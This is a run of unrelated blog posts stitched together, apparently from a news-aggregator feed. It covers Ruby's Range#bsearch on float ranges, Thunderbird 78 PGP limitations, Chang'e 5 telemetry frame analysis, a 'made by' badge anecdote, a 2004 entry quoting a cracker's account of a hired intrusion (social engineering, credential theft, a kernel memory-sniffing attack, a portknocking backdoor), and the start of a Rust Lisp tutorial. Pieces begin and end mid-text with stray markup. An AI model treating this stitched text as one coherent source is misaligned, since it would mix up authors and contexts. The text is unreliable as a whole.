<span>puts</span> <span>values</span>
</code></pre></div></div> <p>And when we run it, we get the following output:</p> <div><div><pre><code>The integer larger than 42 is: 43
The following values were inspected:
1
2
4
8
16
32
64
32
48
40
44
42
43
</code></pre></div></div> <p>We see typical binary search behavior.</p> <p>A co-worker recently asked me about some odd behavior when we change the starting value to a float. For example, consider the following code, which is the same as the one above but the range is between 0 and <code>Float::INFINITY</code>:</p> <div><div><pre><code><span>values</span> <span>=</span> <span>[]</span>

<span>found_value</span> <span>=</span> <span>(</span><span>0</span><span>..</span><span>Float</span><span>::</span><span>INFINITY</span><span>).</span><span>bsearch</span> <span>do</span> <span>|</span><span>i</span><span>|</span>
  <span>values</span> <span>&lt;&lt;</span> <span>i</span>
  <span>i</span> <span>&gt;</span> <span>42</span>
<span>end</span>

<span>puts</span> <span>"The float larger than 42 is: </span><span>#{</span><span>found_value</span><span>}</span><span>"</span>
<span>puts</span> <span>"The following values were inspected:"</span>
<span>puts</span> <span>values</span>
</code></pre></div></div> <p>We then get the following output when we run it (note that the output has been truncated because it’s too long):</p> <div><div><pre><code>The float larger than 42 is: 42.00000000000001
The following values were inspected:
1.5
1.6759759912428246e+154
1.5921412270130977e+77
4.8915590244884904e+38
2.7093655358260904e+19

42.92431640625
42.424560546875
42.1746826171875
...
</code></pre></div></div> <p>The first few values we inspect in the binary search are rather odd: <code>1.5</code>, <code>1.6759759912428246e+154</code>, <code>1.5921412270130977e+77</code>, etc. Where do these numbers come from? To explain these values, we first have to understand how IEEE 754 floating-point numbers work.</p>  <p>Ruby floats are double-precision IEEE 754 floating-point numbers. If you don’t know the basics about how floating-point numbers are represented in memory, there are plenty of resources on the internet, <a href="https://fabiensanglard.net/floating_point_visually_explained/">here’s one</a>.</p> <p>Of special interest to us is how infinity is represented in floating-point. Infinity is a special value where the exponent bits are all 1’s and the significand bits (also known as fraction or mantissa) are all 0’s.</p>  <p>Ruby’s <code>Range#bsearch</code> is implemented in a C function called <a href="https://github.com/ruby/ruby/blob/5512de76033773a77f686f3cb2adc849356f7674/range.c#L680"><code>range_bsearch</code></a>. There are several cases it deals with, and the one of interest is the case when either endpoint is a float. In this case, it performs a clever trick. It reads the C double type of the Ruby float endpoints as 64-bit integers (<code>int64_t</code>)<sup id="fnref:1" role="doc-noteref"><a href="#fn:1">1</a></sup>. Note that this is <strong>not</strong> the same as casting the double into integer type, this is directly reading the double as a 64-bit integer. Are you confused? I sure was when I first read this code so if you are too, it’ll make more sense later on. Trust me.</p> <p>Let’s revisit how infinity is represented in floating-point. Here’s it visualized (through the help of the amazing website <a href="https://float.exposed/">float.exposed</a>). We can see that the sign is 0 (this is a positive value), all exponent bits are 1, and all significand bits are 0.</p> <figure> <img src="https://blog.peterzhu.ca/assets/ruby-range-bsearch/infinity.png"> </figure> <p>And of course, <code>0</code> is represented in floating-point with all the bits set to 0.</p> <figure> <img src="https://blog.peterzhu.ca/assets/ruby-range-bsearch/zero.png"> </figure> <p>So what if we read these bits of the endpoint as if they were integers? Then our range would be between <code>0</code> and <code>9218868437227405312</code>. What’s the midpoint of this range? It’s <code>4609434218613702656</code>. Now let’s plug this value back into <a href="https://float.exposed/0x3ff8000000000000">float.exposed</a>.</p> <figure> <img src="https://blog.peterzhu.ca/assets/ruby-range-bsearch/one_point_five.png"> </figure> <p>Oh look, it’s 1.5!</p> <p>Using this same technique, you can now find out why the binary search examines <code>1.6759759912428246e+154</code> and <code>1.5921412270130977e+77</code> after this. This is left as an exercise for the reader.</p>  <p>The reason why this works is simple once you wrap your head around it. It’s because the more significant bits are always in a more significant position (than the bits to the right of it) in floating-point numbers. This is obviously true for the significand. But this is also true for the exponent because the next power of 2 can’t be reached by just increasing the significand, the exponent has to be increased. So thus a larger exponent will always mean that the floating-point number has a larger magnitude.</p> <p>Once this is true, we can see why binary search works using this technique. It works because if <code>x</code> and <code>y</code> are doubles and <code>x &gt; y</code>, then we have shown that <code>double_as_int64(x) &gt; double_as_int64(y)</code> is also true. This is the requirement for binary search because the values remain strictly increasing (<em>technically</em> binary search only requires monotonically increasing, but strictly increasing is a tighter guarantee than monotonically increasing).</p>  <p>Ruby’s binary search in a range uses a clever technique to perform binary search when the endpoints are doubles while maintaining a worst-case runtime of <code>O(n log n)</code>. In fact, this technique isn’t specific to Ruby and can be used in any language that uses IEEE 754 floating-point numbers.</p>  </div> </article> </div></div>]]>

<div>
<p>I am writing this post because Thunderbird 78.x has issues for advanced PGP users. But first, I’d like to say a few words to all the frustrated users: I hear you, I too am displeased with this update, but while it’s easy to complain and rant, we should look at the bright side and still be grateful that Mozilla thought of including PGP, as it makes it more accessible to users that are not as tech-savvy. It’s always good to push for privacy and having it built-in, and easy to use! But, there are issues with the new built-in PGP that we should talk about…</p>
<h2>Preface</h2>
<p>You know, as I stated in <a href="https://www.sindastra.de/p/1566/open-letter-why-it-security-is-obvious-to-me/" target="_blank" rel="noreferrer noopener">my open letter</a>: Security and privacy is important to me. Of course, this means I use PGP, or more specifically, GnuPG with smartcards.</p>
<p>I like FOSS, especially if it’s cross-platform as I use Linux, Mac and Windows (alphabetical order, no preference stated) and it’s great to be able to use your software on all your machines across all systems, and for free! The popular email client, Thunderbird is one such application that meets these criteria, and so is GnuPG (or GPG for short), a popular application that implements the OpenPGP specification.</p>
<p>GnuPG has a ton of features, among those features is the support of smartcards. Keep this in mind.</p>
<p>Now, let’s take a look at the situation in Thunderbird before, and then since version 78.x and what we can do about it.</p>
<h2>The situation <em>before</em> version 78.x</h2>
<p>Before Thunderbird 78.x (namely 68.x), if you had both Thunderbird and GnuPG installed, all you had to do was to install a Thunderbird addon known as Enigmail. This addon basically bridged the gap between Thunderbird and GnuPG, and essentially allowed you to experience full PGP within Thunderbird.</p>
<p>Of course this meant you had to install GnuPG on your system, then an addon, then generate and manage keys, and – although powerful – it was overall not as user-friendly as it could be.</p>
<p>So, even I as an advanced user, was excited that Thunderbird would come with PGP built-in in 78.x as I thought they might ship it with GnuPG, and something like Enigmail but built-in and maybe more user-friendly. At the very least having no third-party things to install sounds better. And convenience is nice, right? But I was wrong.</p>
<h2>The situation <em>since</em> version 78.x</h2>
<p>You see, Mozilla, the people behind Thunderbird did not ship it with GnuPG. Instead, they use a library called RNP. This library does not provide full-featured PGP.</p>
<p>RNP does for example, not support the use of smartcards. Which, basically means no PGP at all for me or any user with smartcards. Thunderbird does currently also not support using subkeys with detached primary key. Which means any advanced user that did a proper, more secure PGP setup, can also not use PGP with Thunderbird for the time being.</p>
<p>So, you might think to yourself: Just install Enigmail! Well, here’s the thing: Enigmail does not work with Thunderbird 78.x!</p>
<p>Thunderbird 78.x has hidden settings in the advanced configuration editor, that you can use to tell it to use external GnuPG, which is great! Except it doesn’t really work…</p>
<p>It did not work for me, and I tried many things, on different systems, followed different guides (including the official Mozilla Wiki), and heard the same from other users through the fediverse. For a friend of mine, setting up Thunderbird to use external GnuPG on Windows made it outright crash whenever trying to open a PGP encrypted email!</p>
<p>And this is basically the problem. On one hand, Mozilla was cool enough to include (some) PGP in Thunderbird which in theory makes it more accessible as you can generate and use keys with a few clicks, which is also good for us advanced users as we can then email privately with friends that would otherwise be unable to use PGP. But on the other hand the execution was bad in such a way that it stabs all the advanced users that were already using (advanced setups of) PGP.</p>
<h2>What to do about it (for now)</h2>
<p>Honestly, my advice to anyone that uses Thunderbird and depends on advanced PGP (smartcard etc.) for now: Just downgrade to Thunderbird 68.x and install Enigmail. It seems it will still receive updates for now and there’s no forced update to 78.x (yet). I just tried, and got an (undocumented) update for the 68.x version (namely 68.12.1).</p>
<p>Let’s hope they will keep providing security updates for 68.x until they have (hopefully) sorted out PGP in version 78.x so that we will eventually be able to upgrade, but without being pushed into a broken environment prematurely.</p>
<p>You can get the latest version of 68.x from here (official download link): <a href="https://download-installer.cdn.mozilla.net/pub/thunderbird/releases/68.12.1/" target="_blank" rel="noreferrer noopener nofollow">https://download-installer.cdn.mozilla.net/pub/thunderbird/releases/68.12.1/</a></p>
<p>Please note that, Thunderbird will notice that the current configuration is from a newer version after downgrading, which you cannot use. This will result in a little window informing you about that on startup. Your only two options are to quit the application, or to create a new (configuration) profile. This means you will have to set up your accounts again but at least PGP will work again (with Enigmail and GnuPG)!</p>
<p>Thank you and goodnight! :D</p>
<h2>UPDATE 2020-NOV-29</h2>
<p>Hey everyone, this article drew many visitors after it was posted on HN (thanks, kind stranger!) and I did read through the comments (both here and some on HN)!</p>
<p>I’d like to address some things:</p>
<ol><li>I saw a tl;dr on HN which mentioned the downgrade recommendation, but without the details. As I understood it, it got criticized as you need to stay up to day for security reasons. And I agree with that. However, I’d like to make it clear that I only recommended a downgrade for now, as it seems the 68.x branch is still getting updates, as I experienced myself. As long as Thunderbird does not drop support for 68.x, and does not force an upgrade to 78.x, I think downgrading is fine. When Thunderbird finally drops support for 68.x, I would of course not recommend staying on outdated software.</li><li>When Thunderbird 68.x reaches EOL, and if 78.x hasn’t sorted out the issues with PGP by then, an alternative, if you’re on Windows and have MS Outlook, would be the free GpgOL extension for Outlook that comes bundled with Gpg4win. Please note that I don’t have experience with this myself, but I’d like to point it out anyway in case it’s useful. There’s also a (paid) Apple Mail extension that comes with gpgtools, however I do not recommend it unless you don’t mind paying for each new major version every year.</li><li>Thank you for informing me that Thunderbird is not part of Mozilla Corporation anymore, but as I understood it, still part of Mozilla Foundation. So, I guess in that case I’m addressing the Mozilla foundation. If this is still wrong, please let me know.</li></ol>
<p>PS I was exhausted and it was late at night when I originally wrote this article, and I wasn’t fully happy with it but people seemed to like it and had very constructive feedback which really helps. Thank you all for stopping by and reading it! &lt;3</p>

<p><a href="https://en.wikipedia.org/wiki/Chang%27e_5">Chang’e 5</a> is a Chinese lunar sample return mission. It was launched a few days ago on 2020-11-23 from <a href="https://en.wikipedia.org/wiki/Wenchang_Satellite_Launch_Center">Wenchang</a> and <a href="https://twitter.com/coastal8049/status/1331782149490413568">is estimated</a> to perform lunar orbit injection on Saturday. Since then, a number of Amateurs such as <a href="https://twitter.com/usa_satcom/status/1331092113069543425">USA Satcom</a>, <a href="https://twitter.com/uhf_satcom/status/1331317024992210944">Paul Marsh M0EYT</a>, <a href="https://twitter.com/coastal8049/status/1331138035891650560">Scott Tilley VE7TIL</a>, <a href="https://twitter.com/supertrack_it/status/1331354629146365953">Fer IW1DTU</a> and others have been receiving the X-band signals from the spacecraft and posting reports over on Twitter. Meanwhile, <a href="http://r00t.cz/">r00t.cz</a> has been working in <a href="https://twitter.com/r2x0t/status/1331097492482646016">decoding the frames</a>, which has led him to the amazing achievement of being able to <a href="http://www.r00t.cz/Sats/Change5">retrieve a short video</a> from the signal.</p>



<p>In this post I will look at some of the frames demodulated by USA Satcom and Paul during the first couple of days of the mission. The frame structure has many similarities with Tianwen-1, which I have described in several posts, such as <a href="https://destevez.net/2020/08/tianwen-1-telemetry-framing-and-data/" data-type="post" data-id="8773">here</a> and <a href="https://destevez.net/2020/08/tianwen-1-high-speed-data-signal/" data-type="post" data-id="8871">here</a>. However, there are some interesting differences.</p>



<h4>Low data rate telemetry</h4>



<p>The low data rate telemetry signal is a PCM/PSK/PM signal with a subcarrier rate of 65536 Hz and a baudrate of 2048 baud. The coding is CCSDS concatenated frames with a Reed-Solomon codeword size of 252 bytes, so that a frame takes 2 seconds to transmit. The Reed-Solomon code uses the dual basis, as specified in the <a href="https://public.ccsds.org/Pubs/131x0b3e1.pdf">TM Synchronization and Channel Coding</a> blue book. This is very similar to Tianwen-1’s low rate signal. The only differences are that Tianwen-1 uses a baudrate of 16384 baud (so frames take 0.25 seconds to transmit), and the conventional Reed-Solomon basis (which is not standard CCSDS).</p>



<p>Chang’e 5 has been seen to use <a href="https://twitter.com/coastal8049/status/1331782140900503556">a number of different frequencies</a> at X-band. Here I will be looking at some frames received by USA Satcom on 2020-11-24 between 4 and 6 UTC.</p>



<p>The frames are CCSDS <a href="https://public.ccsds.org/Pubs/732x0b3e1.pdf">AOS frames</a> coming from spacecraft ID 91. The spacecraft ID is quite relevant, because the spacecraft has different detachable modules: a service module, a return module, a lander, and an ascent module. Most likely each of these modules uses a different spacecraft ID, and we are in fact seeing data from different spacecraft IDs.</p>



<p>Two virtual channels are in use. Virtual channel 1 contains most of the data (a total of 5888 frames), while virtual channel 2 contains only 5 frames.</p>



<p>The AOS frames in both virtual channels have an insert zone that is 8 bytes long. The purpose of the first 4 bytes is unknown, while the last 4 bytes are a little-endian timestamp encoded as the number of seconds elapsed since 2012-08-01 00:00:00 UTC. It is interesting to compare this timestamp format with <a href="https://destevez.net/2020/07/more-about-the-tianwen-1-timestamps/" data-type="post" data-id="8734">that used in Tianwen-1</a>, which uses a 48 bit big-endian timestamp that encodes 100us units since 2016-01-01 00:00:00 Beijing time. The change from big-endian to little-endian is peculiar, since somehow the CCSDS protocols favour big-endian fields, and the change from a Beijing time epoch to a UTC epoch is also an interesting curiosity.</p>



<p>The M_PDU protocol is used to multiplex CCSDS <a href="https://public.ccsds.org/Pubs/133x0b2e1.pdf">Space Packets</a> in the AOS frames.</p>



<p>The figure below shows the timestamps and virtual channel frame counter in the frames from virtual channel 1. The gaps correspond to time gaps between the different files provided by USA Satcom.</p>



<figure><a href="https://destevez.net/wp-content/uploads/2020/11/ce5_vcid1.png"><img loading="lazy" width="625" height="387" src="https://destevez.net/wp-content/uploads/2020/11/ce5_vcid1.png" alt="" srcset="https://destevez.net/wp-content/uploads/2020/11/ce5_vcid1.png 625w, https://destevez.net/wp-content/uploads/2020/11/ce5_vcid1-300x186.png 300w" sizes="(max-width: 625px) 100vw, 625px"></a></figure>



<p>The Space Packets in virtual channel 1 use many different APIDs. I have been browsing through the plots of the data in each of the APIDs and they look reminiscent of Tianwen-1. There are many analogue telemetry channels, but I haven’t been able to spot any that has an obvious meaning, and there doesn’t seem to be any floating point data as in Tianwen-1. Here I show a few of the most interesting APIDs.</p>

<figure><a href="https://destevez.net/wp-content/uploads/2020/11/ce5_apid815.png"><img loading="lazy" src="https://destevez.net/wp-content/uploads/2020/11/ce5_apid815-644x649.png" alt="" width="483" height="487" srcset="https://destevez.net/wp-content/uploads/2020/11/ce5_apid815-644x649.png 644w, https://destevez.net/wp-content/uploads/2020/11/ce5_apid815-298x300.png 298w, https://destevez.net/wp-content/uploads/2020/11/ce5_apid815-150x150.png 150w, https://destevez.net/wp-content/uploads/2020/11/ce5_apid815-768x774.png 768w, https://destevez.net/wp-content/uploads/2020/11/ce5_apid815-100x100.png 100w, https://destevez.net/wp-content/uploads/2020/11/ce5_apid815.png 910w" sizes="(max-width: 483px) 100vw, 483px"></a></figure>



<p>The five frames in virtual channel 2 were transmitted consecutively, perhaps in response to a telecommand. Each of them contains a single Space Packet from APID 897 that occupies all the frame.</p>



<p>The data from these Space Packets looks like some kind of file download or memory dump. The first 8 bytes contain three fixed bytes that maybe identify the file or the region of memory followed by a 5 byte little-endian chunk counter. The transfer here uses only 5 chunks, and most of the data in the last chunk is filled with <code>0xaa</code> padding bytes. The figure below shows the data in this transfer, with one chunk per row. The data clearly shows patterns, but I have no idea what it is.</p>



<figure><a href="https://destevez.net/wp-content/uploads/2020/11/ce5_vc2.png"><img loading="lazy" width="644" height="187" src="https://destevez.net/wp-content/uploads/2020/11/ce5_vc2-644x187.png" alt="" srcset="https://destevez.net/wp-content/uploads/2020/11/ce5_vc2-644x187.png 644w, https://destevez.net/wp-content/uploads/2020/11/ce5_vc2-300x87.png 300w, https://destevez.net/wp-content/uploads/2020/11/ce5_vc2-768x223.png 768w, https://destevez.net/wp-content/uploads/2020/11/ce5_vc2.png 864w" sizes="(max-width: 644px) 100vw, 644px"></a><figcaption>Chang’e transfer in APID 897</figcaption></figure>



<p>The code and data used in this part of the post, including the full plots of all the APIDs, can be found in <a href="https://github.com/daniestevez/jupyter_notebooks/blob/master/CE5/CE-5%20frame%20analysis.ipynb">this Jupyter notebook</a>.</p>



<h4>High data rate telemetry</h4>



<p>The high data rate telemetry uses 2.5Mbaud BPSK <a href="https://twitter.com/r2x0t/status/1331351055972642818">according to r00t</a>. Coding is, as in the case of <a href="https://destevez.net/2020/08/tianwen-1-high-speed-data-signal/">Tianwen-1 high data rate long frames</a>, concatenated CCSDS frames using four interleaved Reed-Solomon codewords (with 255 bytes each).</p>



<p>The data used here is a short segment received by Paul on 2020-11-24 between 20:52 and 20:58 UTC at 8455 MHz. It is quite interesting to see the errors corrected by the Reed-Solomon decoder, which show large variability but indicate that Paul has more than enough SNR margin to decode the signal.</p>



<figure><a href="https://destevez.net/wp-content/uploads/2020/11/ce5_rs.png"><img loading="lazy" width="612" height="387" src="https://destevez.net/wp-content/uploads/2020/11/ce5_rs.png" alt="" srcset="https://destevez.net/wp-content/uploads/2020/11/ce5_rs.png 612w, https://destevez.net/wp-content/uploads/2020/11/ce5_rs-300x190.png 300w" sizes="(max-width: 612px) 100vw, 612px"></a></figure>



<p>The data consists of AOS frames from spacecraft ID 26 (note this is a different spacecraft ID to the one in the low rate data used in the previous part). Virtual channels 38 and 63 are in use, with 18396 and 51850 frames respectively.</p>



<p>In contrast to the AOS frames used for the low data rate telemetry, here the AOS insert zone is only 6 bytes long, with 2 unknown bytes that always contain the value <code>0xf0f0</code> followed by a 4 byte timestamp using the same format as in the low data rate frames. There is no M_PDU. The data follows directly after the insert zone.</p>



<p>Virtual channel 63 consists solely of idle data. This is a standard feature of the AOS Space Data Link protocol called OID channel (only idle data), which is always virtual channel 63. The data in the frames of this virtual channel is filled with <code>0xaa</code> padding.</p>



<p>The figure below shows the timestamps and frame counter in the OID channel.</p>



<figure><a href="https://destevez.net/wp-content/uploads/2020/11/ce5_sc26_oid.png"><img loading="lazy" width="644" height="385" src="https://destevez.net/wp-content/uploads/2020/11/ce5_sc26_oid-644x385.png" alt="" srcset="https://destevez.net/wp-content/uploads/2020/11/ce5_sc26_oid-644x385.png 644w, https://destevez.net/wp-content/uploads/2020/11/ce5_sc26_oid-300x179.png 300w, https://destevez.net/wp-content/uploads/2020/11/ce5_sc26_oid.png 647w" sizes="(max-width: 644px) 100vw, 644px"></a></figure>



<p>The frame loss computed from the jumps in the virtual channel frame counter shows that very few frames were lost. The large jumps near the end correspond to a gap in Paul’s data, which is divided into two files.</p>



<figure><a href="https://destevez.net/wp-content/uploads/2020/11/ce5_sc26_oid_loss.png"><img loading="lazy" width="625" height="387" src="https://destevez.net/wp-content/uploads/2020/11/ce5_sc26_oid_loss.png" alt="" srcset="https://destevez.net/wp-content/uploads/2020/11/ce5_sc26_oid_loss.png 625w, https://destevez.net/wp-content/uploads/2020/11/ce5_sc26_oid_loss-300x186.png 300w" sizes="(max-width: 625px) 100vw, 625px"></a></figure>



<p>Virtual channel 38 is quite interesting. I <a href="https://twitter.com/ea4gpz/status/1331711668045434886">joked on Twitter</a> that it resembles the Inception film, because it has several layers of CCSDS protocols. The timestamps in this virtual channel are quite weird, since comparing with the timestamps from the OID channel they seem to run too fast and extend into the future. There is no way that the 18396 frames in this virtual channel are able to span one hour and 30 minutes as shown here. I’m not sure what’s happening with this.</p>



<figure><a href="https://destevez.net/wp-content/uploads/2020/11/ce5_sc26_vc38_fc.png"><img loading="lazy" width="644" height="385" src="https://destevez.net/wp-content/uploads/2020/11/ce5_sc26_vc38_fc-644x385.png" alt="" srcset="https://destevez.net/wp-content/uploads/2020/11/ce5_sc26_vc38_fc-644x385.png 644w, https://destevez.net/wp-content/uploads/2020/11/ce5_sc26_vc38_fc-300x179.png 300w, https://destevez.net/wp-content/uploads/2020/11/ce5_sc26_vc38_fc.png 647w" sizes="(max-width: 644px) 100vw, 644px"></a></figure>



<p>This shows the first frames in virtual channel 38. We can discern the AOS headers, then two parts that seem quite similar, and then a large section of <code>0xaa</code> padding.</p>



<figure><a href="https://destevez.net/wp-content/uploads/2020/11/ce5_sc26_vc38_fc_data.png"><img loading="lazy" width="644" height="173" src="https://destevez.net/wp-content/uploads/2020/11/ce5_sc26_vc38_fc_data-644x173.png" alt="" srcset="https://destevez.net/wp-content/uploads/2020/11/ce5_sc26_vc38_fc_data-644x173.png 644w, https://destevez.net/wp-content/uploads/2020/11/ce5_sc26_vc38_fc_data-300x80.png 300w, https://destevez.net/wp-content/uploads/2020/11/ce5_sc26_vc38_fc_data-768x206.png 768w, https://destevez.net/wp-content/uploads/2020/11/ce5_sc26_vc38_fc_data.png 877w" sizes="(max-width: 644px) 100vw, 644px"></a></figure>



<p>The data field of each of these AOS frames contains a single Space Packet, which is embedded directly without using M_PDU. The length of the Space Packet is 510 bytes including its header, which explains why the end of the AOS frame is filled with padding. These Space Packets belong to APID 92.</p>



<p>The contents of each of these Space Packets are two back to back AOS frames, which explains the repetition in the figure below. The AOS frames belong to spacecraft ID 197 (yet a new spacecraft!), virtual channel ID 52, and have the replay flag set.</p>



<p>The insert zone of these replayed AOS frames contains three unknown bytes followed by a 32 bit timestamp in the usual format. The timestamps and frame counts are shown below. The replay data is actually from the previous day, starting just 30 minutes after launch.</p>



<figure><img loading="lazy" width="631" height="387" src="https://destevez.net/wp-content/uploads/2020/11/ce5_replay_fc.png" alt="" srcset="https://destevez.net/wp-content/uploads/2020/11/ce5_replay_fc.png 631w, https://destevez.net/wp-content/uploads/2020/11/ce5_replay_fc-300x184.png 300w" sizes="(max-width: 631px) 100vw, 631px"></figure>



<p>These AOS frames have a CRC-16, in contrast with the usual AOS frames, which rely on the Reed-Solomon parity check bytes for error detection. The CRC of all the replay frames I’ve decoded is correct.</p>



<p>These replay AOS frames use M_PDU, and contain Space Packets from APIDs 301 and 2047 (the idle APID). As expected, the idle APID packets contain only zeros. The data in APID 301 is shown in the figure below. I am not sure how to interpret it, but some of the structure is evident.</p>



<figure><a href="https://destevez.net/wp-content/uploads/2020/11/ce5_apid301.png"><img loading="lazy" src="https://destevez.net/wp-content/uploads/2020/11/ce5_apid301-644x640.png" alt="" width="644" height="640" srcset="https://destevez.net/wp-content/uploads/2020/11/ce5_apid301-644x640.png 644w, https://destevez.net/wp-content/uploads/2020/11/ce5_apid301-300x298.png 300w, https://destevez.net/wp-content/uploads/2020/11/ce5_apid301-150x150.png 150w, https://destevez.net/wp-content/uploads/2020/11/ce5_apid301-768x763.png 768w, https://destevez.net/wp-content/uploads/2020/11/ce5_apid301-100x100.png 100w, https://destevez.net/wp-content/uploads/2020/11/ce5_apid301.png 923w" sizes="(max-width: 644px) 100vw, 644px"></a></figure>

    <p>Oh boy, am I glad that I trusted my gut feeling.</p>

<p>You probably know the type of badge I’m talking about.  It’s tiny, lives in the lower-right corner of the screen and says something like “by Jakob Greenfeld”.</p>

<p><img src="https://jakobgreenfeld.com/images/tinybadge.png" alt=""></p>

<p>But not too many indie makers seem to be using it. I hesitated myself. It makes the fact that the project is an indie project immediately obvious. Hence the project will be perceived as less professional. Also it possibly distracts customers and might annoy some of them.</p>

<p>So there are lots of reasons why you shouldn’t include a badge and not really many objective ones why you should.</p>

<p>Nevertheless, I decided to include one on all of my pages. The main reason was that I instantly like a page more if it has such a badge (and not some annoying chat widget or whatever.) It shows me directly that I’m a looking at a project by a fellow indie maker. I really think of the badge as some kind of membership card for the indie maker club.</p>

<p>Okay, enough of this. You’re probably not here to hear about my sentimental feelings.</p>

<p>So let’s get back to the main story.</p>

<p>Now what happened is that yesterday I’m getting lots of new followers even though I didn’t write a single tweet. Also I’m getting lots of Gumroad notifications.</p>

<p><em>“You have a new subscriber for <a href="https://gumspy.com/">Gum Spy</a>”, “You have a new subscriber for Gum Spy”, “You have a new subscriber for Gum Spy”….</em></p>

<p>Cool, but strange. Something must be happening but I have no idea what.</p>

<p>Then I get a DM from <a href="https://twitter.com/TrevMcKendrick">Trevor McKendrick</a> (Chief of Staff @ Lambda School).</p>

<p><img src="https://jakobgreenfeld.com/images/dm.png" alt=""></p>

<p>Apparently, Sam Parr and Shaan Puri talked about me on <a href="https://www.myfirstmillionpodcast.com/">their podcast</a>. The show has hundreds of thousands of listeners. I’m just a guy with 600 Twitter followers who launched his first paid product 4 weeks ago. This is insane.</p>

<p>In the <a href="https://open.spotify.com/episode/496MjbRwFPa52tqdJBvC3m?si=QrBc05p3TlOgEFDl9iqRNA">episode</a>, Shaan mentions that he discovered my stuff because of a tiny badge in the lower-right corner on the Gum Spy landing page.</p>

<p>Without the badge, my site would’ve been just another faceless project. But thanks to the badge, Shaan was quickly able to see that I’m a “build in public type of guy”, that I’m currently doing a <a href="http://jakobgreenfeld.com/mba">Bootstrap MBA learning experiment</a>,  that I recently launched similar projects. And this is why he decided to give me a shoutout on the show.</p>

<p>You probably thought the title of this post is clickbait. It’s not.</p>

<p>I really made dozens of sales (still counting) and got hundreds of new <a href="https://twitter.com/jakobgreenfeld">Twitter followers</a> and <a href="https://productideas.substack.com/">newsletter subscribers</a> only thanks to the tiny badge.</p>

<p>So what’s the takeaway? Use a “made by” badge on your sites, obviously.</p>

<p>And no worries, I’m not trying to sell you some “made by” badge service. The code for the badge I’m using is <a href="https://gist.github.com/levelsio/9c531122e557da6282458bbc2a8e2aff">freely available</a> (thanks <a href="https://levels.ui/">Pieter</a>!) and is so simple that really anyone can use it.</p>

	</p>

	<p>Sean,</p>

	<p>My apologies if any of your time, sanity, peace, or data was lost
	due to the event. But surely I will clarify any of your doubts with
	some information about the attacks.</p>

	<p>It was a hired job. I was sent to take down the majority of <span>XXXXXXXXX</span>'s servers/content and actually
	infiltrated the <span>XXXXXXXXX</span> network
	<em>physically</em>.  I flew to <span>XXXXXXXXXX</span>,
	and social engineered my way onto client machines. From there I
	essentially attained enough credentials that left me able to access
	the companies client database(s), affiliation(s) database(s) … oh
	and logins to your servers.</p>

	<p> … However, your <code>swift.conman.org</code> (or Mark's
	rather) was running gentoo with some modifications including tighter
	suid access on vulnerable binaries on the system, and common
	misconfigurations through the system was also fixed.  Finally, using
	a kernel attack to sniff the memory of a recent “su” execution,
	root was caught.  As I looked around and tried to asses the
	situation, I suppose Mark witnessed (from another location perhaps)
	my SSH login attempts to servers he had access to.  In any case,
	<code>switch.conman.org</code> 
	was unnessesary but I'm glad Mark's paranoia took it down, because
	it would have left much more work for me to do on game day.  By the
	way, I still had access to <code>swift.conman.org</code> even after
	it was patched, I had all known system credentials plus there was a
	kernel entry using portknocking. so if the server was fixed up and
	left on, even during Mark's paranoia it still would have been a
	successful attack on my part.  So yes, the compromise of
	<code>swift.conman.org</code> and the other servers are related.  I
	was sloppy, and Mark is paranoid … I guess I lost that one.</p>

</blockquote>

<p>I certainly wasn't expecting <em>this</em>.</p>

<p>There was more, including details about the company we're hosting the
sites for, even more details about the attack (but really, when it's an
inside job, it's all the more harder to prevent) and some details about
harding servers to prevent such an attack from happening (like a link to <a href="http://www.grsecurity.net/">grsecurity.net</a> which
I have to check out, but most of the other stuff is common sense).  But this
does answer a bunch of questions about the past few weeks of cracking
activity.</p>

<p>And how do I know for a fact that is guy is telling the truth?  He also
included the passwords to several accounts on <code>swift.conman.org</code>. 
To me, that's pretty conclusive evidence.</p>

<p>A new thing I've learned though—<a href="http://www.portknocking.org/">portknocking</a>, something else to look
into.</p>

<blockquote>

	<p>Anyway, I'm typing this as I sit across the street from a
	cybercafe so note not to waste your time backtracing.  This is my
	job, don't take it personal.</p>

	<p>sincerely and respectfully.</p>

</blockquote>

<p>It's tough not to (especially since all this went down while three
hurricanes were headed our way) but I guess that's what I get for living in
a Gibsonian novel these days.</p>

<div>

	<h4>Update on Thursday, September 23<sup>rd</sup>, 2004</h4>

	<p>Just to clarify one last detail:  the cracker did 
	not social engineer his way into the colocation facility in <a href="http://fastcolo.net/" title="FastColo.net">Boca 
	Raton</a> or the <a href="http://www.napoftheamericas.com/">NAP 
	of the Americas</a> in Miami.  The physical access 
	mentioned was the corporate network of the company (which is not 
	located in South Florida) who's sites were hosted on the servers 
	in Boca and Miami.</p>

	<p>Just in case there might have been any confusion 
	on the matter.</p>

	<p>You have my permission to link freely to any entry here.  Go
	ahead, I won't bite.  I promise.</p>

	<p>The dates are the permanent links to that day's entries (or
	entry, if there is only one entry).  The titles are the permanent
	links to <em>that</em> entry only.  The format for the links are
	simple: Start with the base link for this site: <a class="page" href="http://boston.conman.org/">http://boston.conman.org/</a>, then add the date you are
	interested in, say <a href="http://boston.conman.org/2000/08/01">2000/08/01</a>,

	<p>You may also note subtle shading of the links and that's
	intentional: the “closer” the link is (relative to the

	using color shading to denote the distance a link is from here.  If
	you don't notice it, don't worry; it's not all <em>that</em>

November 26, 2020 | https://stopa.io/post/222 | <a href="https://web.archive.org/web/*/https://stopa.io/post/222">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><p><span><p>Many years ago, Peter Norvig wrote a beautiful article <a href="http://norvig.com/lispy.html" target="_blank">about creating a lisp interpreter in Python</a>. It’s the most fun tutorial I’ve seen, not just because it teaches you about my favorite language family (Lisp), but because it cuts through to the essence of interpreters, is fun to follow and quick to finish.</p><p>Recently, I had some time and wanted to learn Rust. It’s a beautiful systems language, and I’ve seen some great work come out from those who adopt it. I thought, <em>what better way to learn Rust, than to create a lisp interpreter in it?</em></p><p><strong>Hence, Risp — a lisp in rust — was born.</strong> In this essay you and I will follow along with <a href="http://norvig.com/lispy.html" target="_blank">Norvig’s Lispy</a>, but instead of Python, we’ll do it in Rust 🙂.</p><p>If you haven’t heard of lisp, some Paul Graham’s essays (<a href="http://www.paulgraham.com/progbot.html" target="_blank">one</a>, <a href="http://www.paulgraham.com/diff.html" target="_blank">two</a>, <a href="http://www.paulgraham.com/avg.html" target="_blank">three</a>), alongside some <a href="https://m.stopa.io/favorite-rich-hickey-talks-6bcb23da6ff2" target="_blank">Rich Hickey talks</a> will get you fired up. In short, everything is a list, everything is an expression, and that makes for a very powerful language.</p><p>Our structure will be similar to Norvig’s tutorial, though I depart slightly in two ways:</p><ol><li>Instead of 